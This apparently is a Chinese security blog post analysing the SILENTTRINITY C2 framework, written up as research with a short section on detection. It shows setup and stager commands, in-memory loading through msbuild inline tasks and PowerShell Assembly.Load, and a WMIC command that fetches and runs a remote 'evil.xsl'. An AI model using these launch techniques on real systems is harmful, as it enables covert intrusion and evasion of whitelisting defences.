@@ -1,0 +1,451 @@
+<article class="post">
+  <h1>SILENTTRINITY利用分析</h1>
+
+  <div class="entry">
+    <h2 id="0x00-前言">0x00 前言</h2>
+<hr>
+
+<p>SILENTTRINITY是由byt3bl33d3r开源的一款C2工具，通过C#实现，利用IronPython引擎来执行Python代码，十分值得研究。这款工具通过Python实现payload，不仅提高了效率，而且利用IronPython引擎从内存加载payload，更为隐蔽。</p>
+
+<p>本文将要站在技术研究的角度，分析SILENTTRINITY的原理并进行扩展，最后给出防御检测的建议</p>
+
+<p>地址：</p>
+
+<p>https://github.com/byt3bl33d3r/SILENTTRINITY</p>
+
+<h2 id="0x01-简介">0x01 简介</h2>
+<hr>
+
+<p>本文将要介绍以下内容：</p>
+
+<ul>
+  <li>SILENTTRINITY的简单使用</li>
+  <li>SILENTTRINITY的实现细节</li>
+  <li>C#利用IronPython调用Python的方法</li>
+  <li>防御检测的建议</li>
+</ul>
+
+<h2 id="0x02-silenttrinity的简单使用">0x02 SILENTTRINITY的简单使用</h2>
+<hr>
+
+<p>操作方法同meterpreter相似</p>
+
+<h3 id="1安装">1、安装</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>git clone https://github.com/byt3bl33d3r/SILENTTRINITY.git
+cd SILENTTRINITY
+python3 -m pip install -r requirements.txt
+python3 st.py
+</code></pre></div></div>
+
+<h3 id="2开启teamserver">2、开启teamserver</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 teamserver.py &lt;teamserver_ip&gt; &lt;teamserver_password&gt;
+</code></pre></div></div>
+
+<h3 id="3连接teamserver">3、连接teamserver</h3>
+
+<p>python3 st.py wss://username:<teamserver_password>@<teamserver_ip>:5000</teamserver_ip></teamserver_password></p>
+
+<h3 id="4开启监听">4、开启监听</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>listeners
+use http
+options
+start
+</code></pre></div></div>
+
+<h3 id="5生成payload">5、生成payload</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>stagers
+list
+use msbuild
+generate http
+</code></pre></div></div>
+
+<h3 id="6启动方式之一">6、启动方式之一</h3>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe msbuild.xml
+</code></pre></div></div>
+
+<h2 id="0x03-silenttrinity的实现细节">0x03 SILENTTRINITY的实现细节</h2>
+<hr>
+
+<p>源码的文件结构如下：</p>
+
+<ul>
+  <li>SILENTTRINITY，核心文件，C#开发，格式为exe</li>
+  <li>SILENTTRINITY_DLL，内容同上，但格式为dll</li>
+  <li>Server，控制端，包括多个Python实现的payload</li>
+</ul>
+
+<p>SILENTTRINITY和SILENTTRINITY_DLL功能相同，只是文件格式不同，所以这里以SILENTTRINITY为例</p>
+
+<h3 id="1silenttrinity">1、SILENTTRINITY</h3>
+
+<p>实现的功能可参照下图右半部分：</p>
+
+<p><img src="https://user-images.githubusercontent.com/5151193/46646842-cd2b0580-cb49-11e8-9218-73226e977d58.png" alt="Alt text"></p>
+
+<p><strong>注：</strong></p>
+
+<p>图片引用自https://github.com/byt3bl33d3r/SILENTTRINITY</p>
+
+<p>详细说明如下：</p>
+
+<h4 id="1-启动ironpython引擎释放资源文件并导入python环境">1. 启动IronPython引擎，释放资源文件并导入Python环境</h4>
+
+<p>资源文件名：IronPython.StdLib.2.7.9.zip</p>
+
+<p>压缩包内的文件为Python的默认模块</p>
+
+<p>如果安装了IronPython，压缩包的文件同默认安装路径下<code class="language-plaintext highlighter-rouge">C:\Program Files\IronPython 2.7\Lib</code>中的文件内容保持一致</p>
+
+<p>IronPython下载地址：</p>
+
+<p>https://github.com/IronLanguages/ironpython2/releases/tag/ipy-2.7.9</p>
+
+<h4 id="2-从server下载stagezip">2. 从Server下载stage.zip</h4>
+
+<p>stage.zip中包含五个文件：</p>
+
+<ul>
+  <li>IronPython.dll</li>
+  <li>IronPython.Modules.dll</li>
+  <li>Microsoft.Dynamic.dll</li>
+  <li>Microsoft.Scripting.dll</li>
+  <li>Main.py</li>
+</ul>
+
+<p>其中，前四个为IronPython引擎的依赖文件，Main.py为主体程序，用于接收控制命令，加载payload，回传输出结果</p>
+
+<h4 id="3-利用ironpython调用python">3. 利用IronPython调用Python</h4>
+
+<p>后面将会详细介绍</p>
+
+<h3 id="2server">2、Server</h3>
+
+<p>作为控制端</p>
+
+<p>modules文件夹下包含所有支持的Python脚本</p>
+
+<p>stagers文件夹下包含三种启动方式：</p>
+
+<ul>
+  <li>msbuild</li>
+  <li>powershell</li>
+  <li>wmic</li>
+</ul>
+
+<h4 id="1-msbuild">1. msbuild</h4>
+
+<p>启动方式：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Windows\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe msbuild.xml
+</code></pre></div></div>
+
+<p>流程：</p>
+
+<p><code class="language-plaintext highlighter-rouge">msbuild.exe</code>-&gt;<code class="language-plaintext highlighter-rouge">.xml</code>-&gt;<code class="language-plaintext highlighter-rouge">C#</code></p>
+
+<p>通过msbuild.exe加载msbuild.xml，这里使用了.NET Framework 4.0中支持了的新功能”Inline Tasks”，被包含在元素UsingTask中，可用来在xml文件中执行c#代码</p>
+
+<p>msbuild.xml实现了将加密字符串做base64解码，解密出SILENTTRINITY，最终在内存中加载(C#实现)</p>
+
+<p>这个利用方法我在之前的文章有过利用分析：</p>
+
+<p><a href="https://3gstudent.github.io/3gstudent.github.io/Use-MSBuild-To-Do-More/">《Use MSBuild To Do More》</a></p>
+
+<h4 id="2-powershell">2. powershell</h4>
+
+<p>启动方式：</p>
+
+<p>执行powershell脚本</p>
+
+<p>流程：</p>
+
+<p><code class="language-plaintext highlighter-rouge">powershell.exe</code>-&gt;<code class="language-plaintext highlighter-rouge">.ps1</code>-&gt;<code class="language-plaintext highlighter-rouge">C#</code></p>
+
+<p>同样是将加密字符串做base64解码，解密出SILENTTRINITY，最终在内存中加载(Powershell实现)，关键代码如下：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$asm = [Reflection.Assembly]::Load($UncompressedFileBytes)
+$type = $asm.GetType("ST")
+$main = $type.GetMethod("Main")
+</code></pre></div></div>
+
+<p>表示加载exe中Main下的ST方法</p>
+
+<p>这个利用方法我在之前的文章有过利用分析：</p>
+
+<p><a href="https://3gstudent.github.io/3gstudent.github.io/%E5%88%A9%E7%94%A8Assembly-Load-&amp;-LoadFile%E7%BB%95%E8%BF%87Applocker%E7%9A%84%E5%88%86%E6%9E%90%E6%80%BB%E7%BB%93/">《利用Assembly Load &amp; LoadFile绕过Applocker的分析总结》</a></p>
+
+<h4 id="3-wmic">3. wmic</h4>
+
+<p>启动方式：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Windows\System32\wbem\WMIC.exe os get /format:"evil.xsl"
+</code></pre></div></div>
+
+<p>或者</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Windows\System32\wbem\WMIC.exe os get /format:"https://example.com/evil.xsl"
+</code></pre></div></div>
+
+<p>流程：</p>
+
+<p><code class="language-plaintext highlighter-rouge">wmic.exe</code>-&gt;<code class="language-plaintext highlighter-rouge">.xsl</code>-&gt;<code class="language-plaintext highlighter-rouge">javascript</code></p>
+
+<p>通过wmic.exe加载wmic.xsl，wmic.xsl可以放在本地，也可以放在远程服务器</p>
+
+<p>同样是将加密字符串做base64解码，解密出SILENTTRINITY，最终在内存中加载(JavaScript实现)</p>
+
+<p>这个利用方法我在之前的文章有过利用分析：</p>
+
+<p><a href="https://3gstudent.github.io/3gstudent.github.io/%E5%88%A9%E7%94%A8wmic%E8%B0%83%E7%94%A8xsl%E6%96%87%E4%BB%B6%E7%9A%84%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/">《利用wmic调用xsl文件的分析与利用》</a></p>
+
+<h4 id="4-其他可供利用的方法">4. 其他可供利用的方法</h4>
+
+<p>SILENTTRINITY未包括，此处作为扩展，例如：</p>
+
+<ul>
+  <li>regsvr32.exe，《Code Execution of Regsvr32.exe》</li>
+  <li>rundll32.exe，<a href="https://3gstudent.github.io/3gstudent.github.io/%E5%85%B3%E4%BA%8E%E5%88%A9%E7%94%A8rundll32%E6%89%A7%E8%A1%8C%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%88%86%E6%9E%90/">《关于利用rundll32执行程序的分析》</a></li>
+</ul>
+
+<h2 id="0x04-c利用ironpython调用python的方法">0x04 C#利用IronPython调用Python的方法</h2>
+<hr>
+
+<p>需要使用IronPython，参考资料：</p>
+
+<p>https://ironpython.net/</p>
+
+<p>本节介绍一些基本用法，有助于进一步扩展SILENTTRINITY的功能</p>
+
+<h3 id="1常用的基本脚本">1、常用的基本脚本</h3>
+
+<p>下载安装IronPython：</p>
+
+<p>https://github.com/IronLanguages/ironpython2/tree/master/Src/IronPythonCompiler</p>
+
+<p>开发工具： VS2015</p>
+
+<p>新建C#工程，添加引用：</p>
+
+<ul>
+  <li>IronPyhon</li>
+  <li>Microsoft.Scripting</li>
+</ul>
+
+<p><strong>注：</strong></p>
+
+<p>编译后生成的exe在执行时需要以下依赖文件：</p>
+
+<ul>
+  <li>IronPython.dll</li>
+  <li>IronPython.Modules.dll(有的工程不需要)</li>
+  <li>Microsoft.Dynamic.dll</li>
+  <li>Microsoft.Scripting.dll</li>
+</ul>
+
+<h4 id="1简单的hello-world程序调用testpy输出hello-world">1.简单的hello world程序，调用test.py，输出Hello World</h4>
+
+<p>code1:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using IronPython.Hosting;
+
+namespace IronPythonTest
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            var engine = Python.CreateEngine();
+            engine.ExecuteFile("test.py");
+
+        }
+    }
+}
+</code></pre></div></div>
+
+<p>test.py:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>print("Hello World")
+</code></pre></div></div>
+
+<h4 id="2向python脚本传参数并输出">2.向python脚本传参数并输出</h4>
+
+<p>code2:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using IronPython.Hosting;
+namespace IronPythonTest
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            var engine = Python.CreateEngine();
+
+            var scope = engine.CreateScope();
+
+            scope.SetVariable("argv", "Hello World");
+
+            engine.ExecuteFile("test.py",scope);
+        }
+    }
+}
+</code></pre></div></div>
+
+<p>test.py:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>print('%s'%argv)
+</code></pre></div></div>
+
+<h4 id="3调用python脚本的main函数">3.调用python脚本的main函数</h4>
+
+<p>code3:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using IronPython.Hosting;
+
+namespace IronPythonTest
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            var engine = Python.CreateEngine();
+            var scope = engine.CreateScope();
+            engine.ExecuteFile("test.py",scope);
+
+            dynamic main = scope.GetVariable("main");
+
+            main();
+
+
+        }
+    }
+}
+</code></pre></div></div>
+
+<p>test.py:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>def main():
+        print("Hello World")
+if __name__ == '__main__':
+	main("")
+</code></pre></div></div>
+
+<h4 id="4将python脚本的内容存储在变量中并执行">4.将python脚本的内容存储在变量中并执行</h4>
+
+<p>code4:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using IronPython.Hosting;
+
+namespace IronPythonTest
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            string script = "print('%s'%argv)";
+            var engine = Python.CreateEngine();
+            var scope = engine.CreateScope();
+            scope.SetVariable("argv", "Hello World");
+            var sourceCode = engine.CreateScriptSourceFromString(script);
+            sourceCode.Execute(scope);
+        }
+    }
+}
+</code></pre></div></div>
+
+<h4 id="5python脚本支持第三方库">5.python脚本支持第三方库</h4>
+
+<p>code5:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>using System;
+using System.Collections.Generic;
+using System.Linq;
+using System.Text;
+using IronPython.Hosting;
+
+namespace IronPythonTest
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            var engine = Python.CreateEngine();
+            engine.SetSearchPaths(new[] { "Lib" });
+            engine.ExecuteFile("test.py");
+        }
+    }
+}
+</code></pre></div></div>
+
+<p>找到IronPython的安装路径，默认为<code class="language-plaintext highlighter-rouge">C:\Program Files\IronPython 2.7</code></p>
+
+<p>将其中的Lib目录复制到编译生成的IronPythonTest.exe的同级目录下</p>
+
+<p>test.py:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>import os
+os.system("calc.exe")
+</code></pre></div></div>
+
+<h3 id="2使用ipyc将python脚本编译成exe">2、使用ipyc将python脚本编译成exe</h3>
+
+<p>类似于py2exe的功能</p>
+
+<p>源码：</p>
+
+<p>https://github.com/IronLanguages/ironpython2/tree/master/Src/IronPythonCompiler</p>
+
+<p>编译好的文件可从IronPython的目录中获得</p>
+
+<p>默认安装位置：</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Program Files\IronPython 2.7\ipyc.exe
+</code></pre></div></div>
+
+<h2 id="0x05-防御检测">0x05 防御检测</h2>
+<hr>
+
+<p>SILENTTRINITY的启动程序本身不包含恶意的功能，只是从远程服务器下载文件并利用IronPython调用Python，这是一个完全正常的功能</p>
+
+<p>启动方式上利用了Windows系统本身自带的程序(例如msbuild.exe,powershell.exe,wmic.exe,也可以扩展成regsvr32.exe或rundll32.exe)，较为隐蔽</p>
+
+<p>但SILENTTRINITY需要发起网络连接，传输stage.zip和Python脚本，所以如果程序调用了IronPython并发起了网络连接，极有可能是存在风险的行为</p>
+
+<h2 id="0x06-小结">0x06 小结</h2>
+<hr>
+
+<p>本文分析了SILENTTRINITY的实现细节，提出了一些扩展的思路，介绍了C#利用IronPython调用Python的方法，结合SILENTTRINITY的特征，给出防御检测的建议。</p>
+
+<hr>
+
+<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>
+
+
+  </div>
+
+  <div class="date">
+    Written on May  5, 2019
+  </div>
+
+  
+</article>
